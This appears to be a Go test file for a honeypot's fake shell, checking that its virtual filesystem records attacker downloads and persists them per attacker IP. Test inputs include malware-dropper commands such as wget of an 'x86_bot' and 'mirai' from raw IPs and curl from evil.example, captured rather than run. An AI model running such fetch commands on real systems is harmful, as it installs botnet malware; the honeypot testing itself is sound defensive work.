package shell

import (
	"context"
	"strings"
	"testing"
)

func TestVFSNavAndFiles(t *testing.T) {
	fs := NewFS("/root")
	if out, ok := fs.Apply("cd", []string{"cd", "/tmp"}, "cd /tmp"); !ok || out != "" {
		t.Fatalf("cd: ok=%v out=%q", ok, out)
	}
	if fs.Cwd != "/tmp" {
		t.Errorf("cwd=%q want /tmp", fs.Cwd)
	}
	if out, _ := fs.Apply("pwd", []string{"pwd"}, "pwd"); out != "/tmp\r\n" {
		t.Errorf("pwd=%q", out)
	}
	// echo into a file, then cat it back (with cwd-relative path).
	fs.Apply("echo", []string{"echo", "hello", ">", "a.txt"}, "echo hello > a.txt")
	out, ok := fs.cat([]string{"cat", "a.txt"})
	if !ok || !strings.Contains(out, "hello") {
		t.Errorf("cat a.txt = %q ok=%v", out, ok)
	}
	// ls augmentation shows the created file.
	ls := fs.AugmentLs([]string{"ls"}, "")
	if !strings.Contains(ls, "a.txt") {
		t.Errorf("ls did not show a.txt: %q", ls)
	}
	// rm removes it; cat then reports not-found (tombstone via overlay delete).
	fs.Apply("rm", []string{"rm", "a.txt"}, "rm a.txt")
	if _, ok := fs.Nodes["/tmp/a.txt"]; ok {
		t.Error("a.txt should be gone after rm")
	}
}

func TestVFSFetchCapturesDropper(t *testing.T) {
	fs := NewFS("/root")
	fs.Apply("cd", []string{"cd", "/tmp"}, "cd /tmp")
	out, ok := fs.Apply("wget", []string{"wget", "http://185.0.0.9/x86_bot"}, "wget http://185.0.0.9/x86_bot")
	if !ok || !strings.Contains(out, "saved") {
		t.Fatalf("wget out=%q ok=%v", out, ok)
	}
	if n := fs.Nodes["/tmp/x86_bot"]; n == nil || n.Src != "http://185.0.0.9/x86_bot" {
		t.Fatalf("dropper node not recorded: %+v", fs.Nodes["/tmp/x86_bot"])
	}
	if len(fs.Downloads) != 1 || fs.Downloads[0] != "http://185.0.0.9/x86_bot" {
		t.Errorf("download URL not captured: %v", fs.Downloads)
	}
	// curl -O target name.
	fs.Apply("curl", []string{"curl", "-O", "payload.sh", "https://evil.example/p"}, "curl -O payload.sh https://evil.example/p")
	if _, ok := fs.Nodes["/tmp/payload.sh"]; !ok {
		t.Error("curl -O target not created")
	}
}

func TestVFSPersistRoundTrip(t *testing.T) {
	dir := t.TempDir()
	ip := "185.220.101.42"
	fs := LoadFS(dir, ip, "/root") // fresh
	fs.Apply("mkdir", []string{"mkdir", "/tmp/.x"}, "mkdir /tmp/.x")
	fs.Apply("wget", []string{"wget", "http://evil/bot"}, "wget http://evil/bot")
	if err := SaveFS(dir, ip, fs); err != nil {
		t.Fatal(err)
	}
	// Reconnect: a fresh load must see the dropper + dir.
	again := LoadFS(dir, ip, "/root")
	if _, ok := again.Nodes["/tmp/.x"]; !ok {
		t.Error("created dir did not persist")
	}
	if len(again.Downloads) != 1 {
		t.Errorf("downloads did not persist: %v", again.Downloads)
	}
	// A different IP gets an independent (empty) filesystem.
	other := LoadFS(dir, "8.8.8.8", "/root")
	if len(other.Nodes) != 0 {
		t.Error("filesystems must be per-attacker")
	}
}

func TestVFSCapsNoPanic(t *testing.T) {
	fs := NewFS("/root")
	for i := 0; i < vfsMaxNodes+50; i++ {
		fs.Apply("touch", []string{"touch", "/tmp/f" + itoaShort(i)}, "")
	}
	if len(fs.Nodes) > vfsMaxNodes {
		t.Errorf("node cap not enforced: %d > %d", len(fs.Nodes), vfsMaxNodes)
	}
}

func TestRunWithFSPersistsAcrossSessions(t *testing.T) {
	fs := NewFS("/root")
	// Session 1: attacker drops a payload (nil arch → generic shell).
	in1 := strings.NewReader("cd /tmp\nwget http://185.0.0.9/mirai\nexit\n")
	RunWithFS(context.Background(), in1, &strings.Builder{}, nil, fs)
	if len(fs.Downloads) == 0 {
		t.Fatal("session 1 did not capture the download")
	}
	// Session 2: same fs — the dropper is still there and lists.
	in2 := strings.NewReader("cd /tmp\nls\ncat mirai\nexit\n")
	var out2 strings.Builder
	RunWithFS(context.Background(), in2, &out2, nil, fs)
	if !strings.Contains(out2.String(), "mirai") {
		t.Errorf("session 2 ls/cat did not show the persisted dropper:\n%s", out2.String())
	}
}

func itoaShort(n int) string {
	if n == 0 {
		return "0"
	}
	var b [12]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
